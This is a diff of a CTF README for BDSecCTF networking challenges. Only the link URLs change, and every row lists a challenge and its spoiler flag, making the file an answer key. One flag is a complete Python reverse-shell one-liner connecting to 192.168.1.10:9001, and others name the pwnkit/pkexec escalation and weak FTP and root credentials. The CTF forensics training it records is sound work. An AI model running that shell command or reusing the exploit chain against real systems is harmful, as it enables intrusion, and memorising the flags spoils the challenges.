@@ -87,26 +87,26 @@ The goal is to solve cybersecurity tests in various categories. The validation o
 
 | Chall Name | Points | Goal | Flag |
 |------------|:------:|:----:|:----:|
-|[Victim & Attacker ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#victim--attacker)|25|Find the ip of the server and the attacker|<details><summary>`Spoiler`</summary>`BDSEC{192.168.1.13_192.168.1.10}`</details> |
-|[Which FTP ? ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#which-ftp)|50|Find the ftp version|<details><summary>`Spoiler`</summary>`BDSEC{vsFTPd_3.0.3}` |
-|[FTP Creads ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#ftp-creads)|50|Find the credentials to access the ftp server|<details><summary>`Spoiler`</summary>`BDSEC{ftpadmin_ftpadmin}`</details> |
-|[Uploaded File ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#uploaded-file)|50|Find the file uploaded on the server| <details><summary>`Spoiler`</summary>`BDSEC{/files/.hacker.not}`</details> |
-|[Log Filer ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#log-file)|50|Find the name of the log file associated with the ftp server|<details><summary>`Spoiler`</summary>`BDSEC{vsftpd.log}`</details> |
-|[Project Incharge ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#project-incharge)|50|Find the name of the person in charge of the project|<details><summary>`Spoiler`</summary>`BDSEC{Mark}`</details> |
-|[Loooon Looong ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#loooong-loooong)|50|Find the date of an event in the logs|<details><summary>`Spoiler`</summary>`BDSEC{Thu_Jul_14_10:16:59}`</details> |
-|[Administrator ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#administrator)|50|Find the information entered in a login form|<details><summary>`Spoiler`</summary>`BDSEC{demo,demo}` |
-|[Shell ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#shell)|50|Find the executed script to have access to the shell|<details><summary>`Spoiler`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
-|[Secret Key ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#secret-key)|50|Find a secret key in a database| <details><summary>`Spoiler`</summary>`BDSEC{2jo3t12nv51w1pw4wk1kj58s1jb6w0}`</details> |
-|[Database Admin ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#database-admin)|50|Find the credentials to connect to the database as admin|<details><summary>`Spoiler`</summary>`BDSEC{root_root}`</details> |
-|[HostName ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#hostname)|50|Find the hostname of the server|<details><summary>`Spoiler`</summary>`BDSEC{ftpadmin}`</details> |
-|[CodeName ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#codename)|50|Find the codename of a server|<details><summary>`Spoiler`</summary>`BDSEC{xenial}`</details> |
-|[Server Info ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#server-info)|50|Find the Server Bone and the version used|<details><summary>`Spoiler`</summary>`BDSEC{Ubuntu_16.04.1_LTS_Xenial_Xerus}`</details> |
-|[Service Exploit ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#service-exploit)|50|Find the service package used|<details><summary>`Spoiler`</summary>`BDSEC{polkit}`</details> |
-|[Exploit Exploit Exploit ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#exploit-exploit)|50|Find the name of the exploit used|<details><summary>`Spoiler`</summary>`BDSEC{pwnkit}`</details> |
-|[Vulnerable Service ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#vuln%C3%A9rable-service)| 50|Find the name of the vulnerable service|<details><summary>`Spoiler`</summary>`BDSEC{pkexec}` |
-|[msg.txt ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#msgtxt)|50|Find a note|<details><summary>`Spoiler`</summary>`BDSEC{The_Server_Is_Now_under_My_Control_:D_:D}`</details> |
-|[Attacker ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#attacker)|50|Find the name of an attacker|<details><summary>`Spoiler`</summary>`BDSEC{N4N0M473}`</details> |
-|[Server User's ✔](https://github.com/Beel0w/BDSecCTF/main/Networking/README.md#server-users) |50|Find the number of users|<details><summary>`Spoiler`</summary>`BDSEC{8}`</details> |  
+|[Victim & Attacker ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking#victim--attacker)|25|Find the ip of the server and the attacker|<details><summary>`Spoiler`</summary>`BDSEC{192.168.1.13_192.168.1.10}`</details> |
+|[Which FTP ? ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#which-ftp)|50|Find the ftp version|<details><summary>`Spoiler`</summary>`BDSEC{vsFTPd_3.0.3}` |
+|[FTP Creads ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#ftp-creads)|50|Find the credentials to access the ftp server|<details><summary>`Spoiler`</summary>`BDSEC{ftpadmin_ftpadmin}`</details> |
+|[Uploaded File ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#uploaded-file)|50|Find the file uploaded on the server| <details><summary>`Spoiler`</summary>`BDSEC{/files/.hacker.not}`</details> |
+|[Log Filer ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#log-file)|50|Find the name of the log file associated with the ftp server|<details><summary>`Spoiler`</summary>`BDSEC{vsftpd.log}`</details> |
+|[Project Incharge ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#project-incharge)|50|Find the name of the person in charge of the project|<details><summary>`Spoiler`</summary>`BDSEC{Mark}`</details> |
+|[Loooon Looong ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#loooong-loooong)|50|Find the date of an event in the logs|<details><summary>`Spoiler`</summary>`BDSEC{Thu_Jul_14_10:16:59}`</details> |
+|[Administrator ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#administrator)|50|Find the information entered in a login form|<details><summary>`Spoiler`</summary>`BDSEC{demo,demo}` |
+|[Shell ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#shell)|50|Find the executed script to have access to the shell|<details><summary>`Spoiler`</summary>`BDSEC{python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'}`</details> |
+|[Secret Key ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#secret-key)|50|Find a secret key in a database| <details><summary>`Spoiler`</summary>`BDSEC{2jo3t12nv51w1pw4wk1kj58s1jb6w0}`</details> |
+|[Database Admin ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#database-admin)|50|Find the credentials to connect to the database as admin|<details><summary>`Spoiler`</summary>`BDSEC{root_root}`</details> |
+|[HostName ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#hostname)|50|Find the hostname of the server|<details><summary>`Spoiler`</summary>`BDSEC{ftpadmin}`</details> |
+|[CodeName ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#codename)|50|Find the codename of a server|<details><summary>`Spoiler`</summary>`BDSEC{xenial}`</details> |
+|[Server Info ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#server-info)|50|Find the Server Bone and the version used|<details><summary>`Spoiler`</summary>`BDSEC{Ubuntu_16.04.1_LTS_Xenial_Xerus}`</details> |
+|[Service Exploit ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#service-exploit)|50|Find the service package used|<details><summary>`Spoiler`</summary>`BDSEC{polkit}`</details> |
+|[Exploit Exploit Exploit ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#exploit-exploit)|50|Find the name of the exploit used|<details><summary>`Spoiler`</summary>`BDSEC{pwnkit}`</details> |
+|[Vulnerable Service ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#vuln%C3%A9rable-service)| 50|Find the name of the vulnerable service|<details><summary>`Spoiler`</summary>`BDSEC{pkexec}` |
+|[msg.txt ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#msgtxt)|50|Find a note|<details><summary>`Spoiler`</summary>`BDSEC{The_Server_Is_Now_under_My_Control_:D_:D}`</details> |
+|[Attacker ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#attacker)|50|Find the name of an attacker|<details><summary>`Spoiler`</summary>`BDSEC{N4N0M473}`</details> |
+|[Server User's ✔](https://github.com/Beel0w/BDSecCTF/tree/main/Networking/README.md#server-users) |50|Find the number of users|<details><summary>`Spoiler`</summary>`BDSEC{8}`</details> |  
 
 **Total : 46 Challenges ( 3220 Points )**
  
